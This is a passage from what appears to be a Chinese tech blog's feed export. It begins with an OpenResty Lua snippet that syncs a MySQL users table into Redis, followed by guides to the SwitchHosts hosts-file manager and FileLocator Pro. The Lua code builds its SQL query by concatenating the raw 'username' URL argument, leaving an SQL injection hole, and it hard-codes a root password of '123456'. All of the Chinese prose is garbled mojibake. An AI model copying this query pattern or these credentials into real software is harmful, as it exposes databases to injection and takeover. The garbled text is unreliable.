class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">init_by_lua_block&#123;<br><br>redis = require &quot;resty.redis&quot;<br>    mysql = require &quot;resty.mysql&quot;<br>    cjson = require &quot;cjson&quot;<br>&#125;<br><span class="hljs-keyword">location</span> /&#123;<br>default_type &quot;text/html&quot;;<br>content_by_lua_block&#123;<br><br><span class="hljs-comment">--è·å–è¯·æ±‚çš„å‚æ•°username</span><br><span class="hljs-keyword">local</span> param = ngx.req.get_uri_args()[&quot;username&quot;]<br><span class="hljs-comment">--å»ºç«‹mysqlæ•°æ®åº“çš„è¿æ¥</span><br><span class="hljs-keyword">local</span> db = mysql:<span class="hljs-built_in">new</span>()<br><span class="hljs-keyword">local</span> ok,err = db:<span class="hljs-keyword">connect</span>&#123;<br>host=&quot;192.168.200.111&quot;,<br>port=<span class="hljs-number">3306</span>,<br><span class="hljs-keyword">user</span>=&quot;root&quot;,<br><span class="hljs-keyword">password</span>=&quot;123456&quot;,<br><span class="hljs-keyword">database</span>=&quot;nginx_db&quot;<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed connect to mysql:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">--è®¾ç½®è¿æ¥è¶…æ—¶æ—¶é—´</span><br>db:set_timeout(<span class="hljs-number">1000</span>)<br><span class="hljs-comment">--æŸ¥è¯¢æ•°æ®</span><br><span class="hljs-keyword">local</span> <span class="hljs-keyword">sql</span> = &quot;&quot;;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> param <span class="hljs-keyword">then</span><br><span class="hljs-keyword">sql</span>=&quot;select * from users&quot;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">sql</span>=&quot;select * from users where username=&quot;..&quot;&#x27;&quot;..param..&quot;&#x27;&quot;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">local</span> res,err,errcode,<span class="hljs-built_in">sqlstate</span>=db:query(<span class="hljs-keyword">sql</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed to query from mysql:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">--è¿æ¥redis</span><br><span class="hljs-keyword">local</span> rd = redis:<span class="hljs-built_in">new</span>()<br>ok,err = rd:<span class="hljs-keyword">connect</span>(&quot;192.168.200.111&quot;,<span class="hljs-number">6379</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span><br> ngx.say(&quot;failed to connect to redis:&quot;,err)<br> <span class="hljs-keyword">return</span><br><span class="hljs-keyword">end</span><br>rd:set_timeout(<span class="hljs-number">1000</span>)<br><span class="hljs-comment">--å¾ªç¯éå†æ•°æ®</span><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> ipairs(res) <span class="hljs-keyword">do</span><br> rd:<span class="hljs-keyword">set</span>(&quot;user_&quot;..v.username,cjson.encode(v))<br><span class="hljs-keyword">end</span><br>ngx.say(&quot;success&quot;)<br>rd:<span class="hljs-keyword">close</span>()<br>db:<span class="hljs-keyword">close</span>()<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nginx</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨å°å·¥å…·</title>
    <link href="/2023/01/16/%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/01/16/%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFhosts%E6%96%87%E4%BB%B6">ä»€ä¹ˆæ˜¯hostsæ–‡ä»¶ï¼Ÿ</a></li><li><a href="#switchhosts"><strong>SwitchHosts</strong></a></li></ul></li><li><a href="#%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7">åŠŸèƒ½ç‰¹æ€§</a></li><li><a href="#%E5%AE%89%E8%A3%85">å®‰è£…</a><ul><li><a href="#%E4%B8%8B%E8%BD%BD">ä¸‹è½½</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD">æ•°æ®å¤‡ä»½</a></li><li><a href="#%E5%BC%80%E5%8F%91%E4%BB%A5%E5%8F%8A%E6%9E%84%E5%BB%BA">å¼€å‘ä»¥åŠæ„å»º</a><ul><li><a href="#%E5%BC%80%E5%8F%91">å¼€å‘</a></li><li><a href="#%E6%9E%84%E5%BB%BA%E5%8F%8A%E6%89%93%E5%8C%85">æ„å»ºåŠæ‰“åŒ…</a></li></ul></li><li><a href="#switchhost%E4%BD%BF%E7%94%A8">SwitchHostä½¿ç”¨</a></li><li><a href="#%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90">æ²¡æœ‰æƒé™ï¼Ÿ</a></li><li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">æ³¨æ„äº‹é¡¹</a><ul><li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li></ul></li><li><a href="#filelocator-pro-%E8%BD%AF%E4%BB%B6%E7%95%8C%E9%9D%A2">FileLocator Pro è½¯ä»¶ç•Œé¢</a></li><li><a href="#%E5%85%AD%E9%A1%B9%E7%89%B9%E8%89%B2%E5%8A%9F%E8%83%BD">å…­é¡¹ç‰¹è‰²åŠŸèƒ½</a><ul><li><a href="#1-%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2-%E6%94%AF%E6%8C%8150%E6%96%87%E6%A1%A3%E6%A0%BC%E5%BC%8F-%E4%BB%A5%E5%8F%8A-%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6">1. å…¨æ–‡æ£€ç´¢ â€“ æ”¯æŒ50+æ–‡æ¡£æ ¼å¼ ä»¥åŠ ä¸­æ–‡å­—ç¬¦</a></li><li><a href="#2-%E6%B7%B1%E5%BA%A6%E6%90%9C%E7%B4%A2-%E6%90%9C%E7%B4%A2%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%86%85%E7%9A%84%E6%96%87%E4%BB%B6">2. æ·±åº¦æœç´¢ â€“ æœç´¢å‹ç¼©åŒ…å†…çš„æ–‡ä»¶</a></li><li><a href="#3-%E5%B8%83%E5%B0%94-%E6%AD%A3%E5%88%99-dos-%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%8F%AF%E7%94%A8%E5%A4%9A%E7%A7%8D%E6%90%9C%E7%B4%A2%E6%96%B9%E5%BC%8F-%E8%A7%84%E5%88%99">3. å¸ƒå°”/ æ­£åˆ™/ DOS è¡¨è¾¾å¼ â€“ å¯ç”¨å¤šç§æœç´¢æ–¹å¼ã€è§„åˆ™</a></li><li><a href="#4-%E5%86%85%E5%A4%96%E5%85%BC%E5%BE%97%E7%9A%84%E6%96%87%E6%A1%A3%E6%9F%A5%E7%9C%8B%E5%99%A8">4. å†…å¤–å…¼å¾—çš„æ–‡æ¡£æŸ¥çœ‹å™¨</a></li><li><a href="#5-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E9%AB%98%E5%BA%A6%E9%9B%86%E6%88%90">5. ä¸ç³»ç»Ÿé«˜åº¦é›†æˆ</a></li><li><a href="#6-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84-unicode-%E6%94%AF%E6%8C%81">6. æ–‡ä»¶ç³»ç»Ÿçš„ Unicode æ”¯æŒ</a></li></ul></li><li><a href="#%E6%9B%B4%E9%AB%98%E6%95%88%E4%BD%BF%E7%94%A8-filelocator-pro">æ›´é«˜æ•ˆä½¿ç”¨ Filelocator Pro</a><ul><li><a href="#1-%E5%B0%86-filelocator-pro-%E5%AE%89%E8%A3%85%E5%88%B0-u-%E7%9B%98">1. å°† Filelocator Pro å®‰è£…åˆ° U ç›˜</a></li><li><a href="#2-%E4%BF%9D%E5%AD%98%E6%90%9C%E7%B4%A2%E6%9D%A1%E4%BB%B6-%E5%8F%8A-%E5%AF%BC%E5%87%BA%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C">2. ä¿å­˜æœç´¢æ¡ä»¶ åŠ å¯¼å‡ºæœç´¢ç»“æœ</a></li></ul></li></ul></p><p>[toc]</p><h1 id="switchhostä½¿ç”¨æŒ‡å—"><a class="markdownIt-Anchor" href="#switchhostä½¿ç”¨æŒ‡å—"></a> switchHostä½¿ç”¨æŒ‡å—</h1><h3 id="ä»€ä¹ˆæ˜¯hostsæ–‡ä»¶"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯hostsæ–‡ä»¶"></a> ä»€ä¹ˆæ˜¯hostsæ–‡ä»¶ï¼Ÿ</h3><p>ç®€å•çš„è¯´ï¼Œhostsæ–‡ä»¶æ˜¯ç”¨äºæœ¬åœ°dnsæœåŠ¡çš„ï¼Œé‡‡ç”¨ipåŸŸåçš„æ ¼å¼å†™åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å½“ä¸­ï¼ŒHostsæ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬ç­‰å·¥å…·æ‰“å¼€ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç³»ç»Ÿå†ä¼šå°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚</p><h3 id="switchhosts"><a class="markdownIt-Anchor" href="#switchhosts"></a> <strong>SwitchHosts</strong></h3><p>é¡¹ç›®ä¸»é¡µï¼š<a href="https://switchhosts.vercel.app">https://switchhosts.vercel.app</a></p><p>SwitchHosts æ˜¯ä¸€ä¸ªç®¡ç† hosts æ–‡ä»¶çš„åº”ç”¨ï¼ŒåŸºäº <a href="http://electron.atom.io/">Electron</a> ã€<a href="https://facebook.github.io/react/">React</a>ã€<a href="https://umijs.org/">UmiJS</a> ã€<a href="https://chakra-ui.com/">Chakra UI</a>ã€<a href="http://codemirror.net/">CodeMirror</a> ç­‰æŠ€æœ¯å¼€å‘ã€‚</p><blockquote><p>æˆªå›¾</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116195702055.png" alt="image-20230116195702055" /></p><h2 id="åŠŸèƒ½ç‰¹æ€§"><a class="markdownIt-Anchor" href="#åŠŸèƒ½ç‰¹æ€§"></a> åŠŸèƒ½ç‰¹æ€§</h2><ul><li>å¿«é€Ÿåˆ‡æ¢ hosts æ–¹æ¡ˆ</li><li>hosts è¯­æ³•é«˜äº®</li><li>æ”¯æŒä»ç½‘ç»œåŠ è½½è¿œç¨‹ hosts é…ç½®</li><li>å¯ä»ç³»ç»Ÿèœå•æ å›¾æ ‡å¿«é€Ÿåˆ‡æ¢ hosts</li></ul><h2 id="å®‰è£…"><a class="markdownIt-Anchor" href="#å®‰è£…"></a> å®‰è£…</h2><h3 id="ä¸‹è½½"><a class="markdownIt-Anchor" href="#ä¸‹è½½"></a> ä¸‹è½½</h3><p>ä½ å¯ä»¥ä¸‹è½½æºç å¹¶è‡ªè¡Œæ„å»ºï¼Œä¹Ÿå¯ä»¥ä»ä»¥ä¸‹åœ°å€ä¸‹è½½å·²æ„å»ºå¥½çš„ç‰ˆæœ¬ï¼š</p><ul><li><p><a href="https://github.com/oldj/SwitchHosts/releases">SwitchHosts Download Page (GitHub release)</a></p></li><li><p>ä¸‹è½½å®Œæˆåï¼Œè§£å‹å‹ç¼©åŒ…ï¼Œä¼šæœ‰ä¸€ä¸ªexeå¯æ‰§è¡Œæ–‡ä»¶</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200044914.png" alt="image-20230116200044914" /></p></li><li><p>exeæ–‡ä»¶å³é”®é€‰æ‹©ä»¥ <strong>ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼Œ</strong> å¹¶å»ºè®®ç»™å…¨ä½“ç”¨æˆ·å®‰è£…ï¼ˆç°åœ¨å¤§å¤šéƒ½æ˜¯ä¸ªäººç”µè„‘ï¼Œåº”è¯¥ä¹Ÿæ— æ‰€è°“ï¼‰ï¼Œå®‰è£…å®Œæˆåé¡µé¢å¦‚ä¸‹ï¼ˆè¿™é‡Œä½¿ç”¨çš„ç½‘å›¾ï¼Œå› ä¸ºæˆ‘å·²ç»å®‰è£…è¿‡äº†ï¼Œä¸æ˜¯åˆå§‹ç•Œé¢ï¼ŒåŒæ—¶å› ä¸ºç‰ˆæœ¬é—®é¢˜ï¼ŒæŒ‰é’®ä½ç½®å’ŒæŒ‰é’®å½¢çŠ¶å¯èƒ½ä¼šæœ‰äº›è®¸ä¸åŒï¼‰</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116195702055.png" alt="image-20230116195702055" /></p></li></ul><p>ä½ ä¹Ÿå¯ä»¥é€šè¿‡ <a href="https://community.chocolatey.org/packages/switchhosts">Chocolatey åŒ…ç®¡ç†å™¨</a>å®‰è£…å·²æ„å»ºå¥½çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">choco <span class="hljs-keyword">install</span> switchhosts<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®å¤‡ä»½"><a class="markdownIt-Anchor" href="#æ•°æ®å¤‡ä»½"></a> æ•°æ®å¤‡ä»½</h2><p>SwitchHosts çš„æ•°æ®æ–‡ä»¶å­˜å‚¨äº <code>~/.SwitchHosts</code> (Windows ä¸‹å­˜å‚¨äºç”¨æˆ·ä¸ªäººæ–‡ä»¶å¤¹ä¸‹çš„ <code>.SwitchHosts</code> æ–‡ä»¶å¤¹ï¼‰ï¼Œ å…¶ä¸­ <code>~/.SwitchHosts/data</code> æ–‡ä»¶å¤¹åŒ…å«æ•°æ®ï¼Œ<code>~/.SwitchHosts/config</code> æ–‡ä»¶å¤¹åŒ…å«å„é¡¹é…ç½®ä¿¡æ¯ã€‚</p><h2 id="å¼€å‘ä»¥åŠæ„å»º"><a class="markdownIt-Anchor" href="#å¼€å‘ä»¥åŠæ„å»º"></a> å¼€å‘ä»¥åŠæ„å»º</h2><h3 id="å¼€å‘"><a class="markdownIt-Anchor" href="#å¼€å‘"></a> å¼€å‘</h3><ul><li>å®‰è£… <a href="https://nodejs.org/">Node.js</a></li><li>åœ¨é¡¹ç›®æ ¹ç›®å½• <code>./</code> ä¸‹ï¼Œè¿è¡Œ <code>npm install</code> å‘½ä»¤å®‰è£…ä¾èµ–</li><li>è¿è¡Œ <code>npm run dev</code> å‘½ä»¤å¯åŠ¨å¼€å‘æœåŠ¡</li><li>è¿è¡Œ <code>npm run start</code> å¯åŠ¨ Appï¼Œå³å¯å¼€å§‹å¼€å‘åŠè°ƒè¯•</li></ul><h3 id="æ„å»ºåŠæ‰“åŒ…"><a class="markdownIt-Anchor" href="#æ„å»ºåŠæ‰“åŒ…"></a> æ„å»ºåŠæ‰“åŒ…</h3><ul><li>æ¨èä½¿ç”¨ <a href="https://github.com/electron-userland/electron-builder">electron-builder</a> è¿›è¡Œæ‰“åŒ…</li><li>è½¬åˆ°é¡¹ç›®æ ¹ç›®å½• â€˜./â€™</li><li>è¿è¡Œ <code>npm run build</code></li><li>è¿è¡Œ <code>npm run make</code>ï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œå¯åœ¨ <code>./dist</code> ç›®å½•ä¸‹æ‰¾åˆ°æ‰“åŒ…åçš„æ–‡ä»¶</li><li>é¦–æ¬¡è¿è¡Œå¯èƒ½éœ€è¦èŠ±è´¹ä¸€äº›æ—¶é—´ï¼Œå› ä¸ºéœ€è¦ä¸‹è½½ç›¸å…³ä¾èµ–æ–‡ä»¶ã€‚ä½ ä¹Ÿå¯ä»¥ä» <a href="https://github.com/electron/electron/releases">è¿™å„¿</a> æˆ–è€… <a href="https://npmmirror.com/mirrors/electron/">æ·˜å®é•œåƒ</a> æ‰‹åŠ¨ä¸‹è½½ï¼Œå¹¶ä¿å­˜åˆ° <code>~/.electron</code> ç›®å½•ä¸‹ã€‚æ›´å¤šä¿¡æ¯å¯è®¿é—® <a href="http://electron.atom.io/docs/">Electron æ–‡æ¡£</a>ã€‚</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># build</span><br>npm <span class="hljs-built_in">run</span> build<br><br><span class="hljs-comment"># make</span><br>npm <span class="hljs-built_in">run</span> make <span class="hljs-comment"># the packed files will be in ./dist</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨å¼€å‘Webé¡¹ç›®è¿‡ç¨‹ä¸­ï¼Œä¸€èˆ¬ä¼šéƒ¨ç½²æœ‰å¤šå¥—ç¯å¢ƒï¼Œç½‘å€åŸŸåéƒ½ç›¸åŒï¼Œéƒ¨ç½²åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œæœ‰å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒã€é¢„å‘å¸ƒç¯å¢ƒã€ç”Ÿäº§ç¯å¢ƒã€‚ç»å¸¸è¦åˆ‡æ¢Hostsæ¥è®¿é—®ï¼Œæµ‹è¯•ä»¥åŠéªŒè¯bugï¼Œå¦‚æœçº¯æ‰‹å·¥ä¿®æ”¹è¿™ä¼šèŠ±æ‰ä¸å°‘æ—¶é—´ã€‚</p><h2 id="switchhostä½¿ç”¨"><a class="markdownIt-Anchor" href="#switchhostä½¿ç”¨"></a> SwitchHostä½¿ç”¨</h2><p>æ–°å»ºåˆ†ç»„ï¼Œä¸€èˆ¬æ˜¯æ­£å¼ç¯å¢ƒä¸€ç»„ï¼Œæµ‹è¯•ç¯å¢ƒä¸€ç»„ï¼Œæœ¬åœ°å¼€å‘ä¸€ç»„</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200509366.png" alt="image-20230116200509366" /></p><h2 id="æ²¡æœ‰æƒé™"><a class="markdownIt-Anchor" href="#æ²¡æœ‰æƒé™"></a> æ²¡æœ‰æƒé™ï¼Ÿ</h2><p>å½“å‡ºç°)è¿™ä¸ªæƒ…å†µéœ€è¦æ£€æŸ¥hostçš„å¯è¯»å†™æƒ…å†µ</p><p>æ‰“å¼€hostæ–‡ä»¶ï¼ˆC:\Windows\System32\drivers\etc\hostsï¼‰å³é”®å±æ€§</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116200651479.png" alt="img" style="zoom:50%;" /><p>éœ€è¦ä¿è¯è¿™é‡Œæœªè¢«å‹¾é€‰åŠå½“å‰æœ‰è¶³å¤Ÿæƒé™</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201252376.png" alt="image-20230116201252376" style="zoom:50%;" /><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œæ˜¯æ²¡æœ‰æƒé™çš„ï¼Œéœ€è¦ç»™ä»–æƒé™ï¼Œç‚¹å‡»ç¼–è¾‘ï¼Œç»™è¶³æƒé™</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201546086.png" alt="image-20230116201546086" style="zoom:50%;" /><p>ç‚¹åº”ç”¨ï¼Œç„¶åä¸€ç›´ç¡®å®š</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201046930.png" alt="image-20230116201046930" style="zoom:50%;" /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230116201532767.png" alt="image-20230116201532767" style="zoom:67%;" /><p>æˆåŠŸï¼</p><h2 id="æ³¨æ„äº‹é¡¹"><a class="markdownIt-Anchor" href="#æ³¨æ„äº‹é¡¹"></a> æ³¨æ„äº‹é¡¹</h2><ul><li>1ã€å¦‚æœä½¿ç”¨äº†ä»£ç†ï¼Œä¿®æ”¹ Hosts ä¹Ÿä¸ä¼šç”Ÿæ•ˆã€‚å› ä¸ºæµè§ˆå™¨ä¼šä¼˜å…ˆè€ƒè™‘ä»£ç†å·¥å…·çš„ä»£ç†ï¼Œå»ºè®®è°ƒè¯•çš„æ—¶å€™å…ˆå…³é—­ä»£ç†ã€‚</li><li>2ã€ä¿®æ”¹äº†hostsä¸ç”Ÿæ•ˆï¼Œä¸€èˆ¬éœ€è¦é‡å¯æµè§ˆå™¨ï¼Œå¦‚æœæ˜¯googleæµè§ˆå™¨å¯ä»¥ä¸ç”¨é‡å¯ï¼Œå¯ä»¥å€ŸåŠ©chrome://net-internals/#dns chrome://net-internals/#sockets æ¸…æ‰<code>keep-alive</code> å’Œæ¸…æµè§ˆå™¨ DNS ç¼“å­˜ã€‚</li></ul><h1 id="filelocator-proå¼ºå¤§é«˜æ•ˆçš„æ— ç´¢å¼•å…¨æ–‡æœç´¢è½¯ä»¶"><a class="markdownIt-Anchor" href="#filelocator-proå¼ºå¤§é«˜æ•ˆçš„æ— ç´¢å¼•å…¨æ–‡æœç´¢è½¯ä»¶"></a> FileLocator Proï¼šå¼ºå¤§é«˜æ•ˆçš„æ— ç´¢å¼•å…¨æ–‡æœç´¢è½¯ä»¶</h1><h3 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€"></a> å‰è¨€</h3><p>æ–‡ä»¶æœç´¢ä¸€ç›´æ˜¯å¤§å®¶å¹³æ—¶æœ€å¸¸ç”¨çš„åŠŸèƒ½ä¹‹ä¸€ã€‚åœ¨æœç´¢æ–‡ä»¶åæ–¹é¢ï¼Œç›®å‰å·²æœ‰ä¸å°‘è½¯ä»¶åšåˆ°äº†æè‡´ï¼Œæ¯”å¦‚ Everything ( <a href="http://www.voidtools.com/">å®˜ç½‘</a> | <a href="http://xbeta.info/everything-search-tool.htm">ä»‹ç»</a> ) ä»¥åŠ æ“ä½œæ–°é¢–çš„æ™šè¾ˆ Listary Pro ( <a href="http://www.listary.com/">å®˜ç½‘</a> | <a href="http://xbeta.info/listary4.htm">ä»‹ç»</a> )  éƒ½æ˜¯æ­¤é¢†åŸŸä¹‹ä½³å“ã€‚ä½†æœ‰æ—¶ï¼Œä»…é€šè¿‡æ–‡ä»¶åå¹¶ä¸è¶³ä»¥å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€æ–‡ä»¶å’Œå†…å®¹ã€‚å› æ­¤ï¼Œæ”¯æŒå…¨æ–‡æœç´¢çš„è½¯ä»¶ï¼Œä¹Ÿæ˜¯é‡åº¦çŸ¥è¯†ç®¡ç†ã€æœç´¢ç”¨æˆ·çš„å¿…å¤‡å·¥å…·ã€‚è¿™æ–¹é¢çš„è§£å†³æ–¹æ¡ˆä¸­ï¼ŒWindowsè‡ªå¸¦çš„ç´¢å¼•åŠŸèƒ½ï¼Œå› ä¸ºæ•ˆç‡å’Œå ç”¨èµ„æºé—®é¢˜ï¼ŒåŸºæœ¬è¢«ç”¨æˆ·æŠ›å¼ƒï¼ˆæ–°ç‰ˆæœ¬æœ‰æ”¹è¿›ï¼‰ã€‚Googleæ¡Œé¢åŠç™¾åº¦æ¡Œé¢ï¼Œéƒ½åŸºæœ¬åœæ­¢æ›´æ–°ã€‚CDSï¼ˆ<a href="http://www.copernic.com/en/products/desktop-search/">Copernic Desktop Search</a>ï¼‰ åœ¨å›½å¤–æœ‰ä¸€å®šçŸ¥ååº¦ï¼Œæä¾›äº†å…è´¹å®¶ç”¨ç‰ˆã€ä¸“ä¸šç‰ˆã€ä¼ä¸šç‰ˆï¼Œä½†å› ä¸ºæ—©æœŸä¸­æ–‡æ”¯æŒä¸ä½³ï¼Œåœ¨å›½å†…ç”¨æˆ·æå°‘ï¼ˆæ®ç§°æœ€æ–°ç‰ˆæœ¬å¯¹ä¸­æ–‡æ”¯æŒæå¥½ï¼‰ã€‚å€’æ˜¯å¼€æºå…è´¹ã€å°å·§ç»¿è‰²çš„ <a href="http://locate32.cogit.net/">Locat32</a> å’Œå¼€æºå…è´¹ã€è·¨å¹³å°çš„ <a href="http://sourceforge.net/projects/docfetcher/">DocFetcher</a> å¾—åˆ°äº†å›½å†…ç”¨æˆ·çš„é’çã€‚</p><p>ä»Šå¤© LYcHEE æ‰€ä»‹ç»çš„ï¼Œæ˜¯å¦ä¸€æ¬¾å…¨æ–‡æ£€ç´¢è½¯ä»¶ <a href="http://mythicsoft.com/filelocatorpro">FileLocator Pro</a> ( <a href="http://xbeta.info/filelocator-pro">ä»‹ç»</a> | <a href="http://mythicsoft.com/filelocatorpro/help/cn/">ä¸­æ–‡å¸®åŠ©</a> )ã€‚ç›¸æ¯”åŒç±»è½¯ä»¶ï¼Œå®ƒçš„ç‰¹ç‚¹æ˜¯ï¼šæ”¯æŒæ›´å¤šæ ¼å¼ä¸å‹ç¼©åŒ…ï¼Œæœç´¢é€Ÿåº¦æ›´å¿«ï¼Œæ— ç´¢å¼•ä¸å ç¡¬ç›˜ç©ºé—´ã€æ”¯æŒ å¤šç§æœç´¢è§„åˆ™ åŠ æ—¥æœŸã€å±æ€§ç­‰ç»†èŠ‚è®¾å®šã€‚FileLocator Pro åœ¨å›½å†…çš„å½±å“æ­£å¤§è¿…é€Ÿæ‰©å¤§ï¼Œç›¸å…³ä»‹ç»æ–‡ç« è¿˜å¯å‚è§<a href="http://www.appinn.com/filelocator-pro-gift/">å°ä¼—è½¯ä»¶</a>ã€<a href="http://www.portablesoft.org/filelocator-pro-portable/">ç²¾å“ç»¿è‰²ä¾¿æºè½¯ä»¶</a>ã€‚</p><p>FileLocator Pro æä¾›äº†30å¤©çš„å…è´¹è¯•ç”¨ï¼Œå›½å¤–å•ç”¨æˆ·æˆæƒä¸º 39 USDã€‚å› ä¸ºå¼€å‘å•† Mythicsoft éå¸¸é‡è§†ä¸­å›½ç”¨æˆ·ï¼Œä¸ä»…åœ¨8æœˆå‘å¸ƒçš„æ–°ç‰ˆä¸­ï¼Œæä¾›äº†ä¸­æ–‡ç•Œé¢ã€<a href="http://mythicsoft.com/filelocatorpro/help/cn/">ä¸­æ–‡å¸®åŠ©æ–‡æ¡£</a>ï¼Œå¹¶å¤§å¹…é™ä½åœ¨åå”®ä»·ï¼Œå°†æˆæƒï¼ˆ1å¹´å†…å…è´¹å‡çº§ï¼‰ä»·æ ¼é™è‡³ <a href="http://item.taobao.com/item.htm?spm=a1z10.1.w4024-2413826112.1.utF9pH&amp;id=19649785919&amp;scene=taobao_shop">130å…ƒ äººæ°‘å¸</a>ã€‚</p><p><a href="https://pan.baidu.com/s/1o8eg6CUT-OodSaNguk1fFg?pwd=yyds">ç»¿è‰²ç‰ˆç½‘ç›˜é“¾æ¥</a></p><h2 id="filelocator-pro-è½¯ä»¶ç•Œé¢"><a class="markdownIt-Anchor" href="#filelocator-pro-è½¯ä»¶ç•Œé¢"></a> FileLocator Pro è½¯ä»¶ç•Œé¢</h2><p>è½¯ä»¶çš„ç•Œé¢å¤§ä½“åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸ (å›¾1)ï¼š<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213920367.png" alt="image-20230207213920367" /></p><p>å›¾1ï¼šFileLocator Pro ç•Œé¢åŒºåŸŸä»‹ç»</p><p>1. é€‰é¡¹å¡å¼æœç´¢åŒºï¼šFileLocator Pro å…è®¸åŒæ—¶è¿›è¡Œå¤šä¸ªæœç´¢è¿›ç¨‹ã€‚</p><p>2. 